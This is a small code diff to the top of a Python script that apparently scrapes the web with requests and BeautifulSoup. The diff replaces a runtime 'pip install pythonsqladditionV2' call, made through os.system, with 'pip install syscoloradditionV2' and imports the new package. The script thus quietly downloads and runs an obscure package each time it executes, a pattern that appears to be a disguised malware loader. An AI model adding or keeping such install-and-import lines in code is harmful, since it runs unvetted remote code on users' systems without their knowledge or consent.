@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqladditionV2")
-import pythonsqladditionV2
+os.system("pip install syscoloradditionV2")
+import syscoloradditionV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
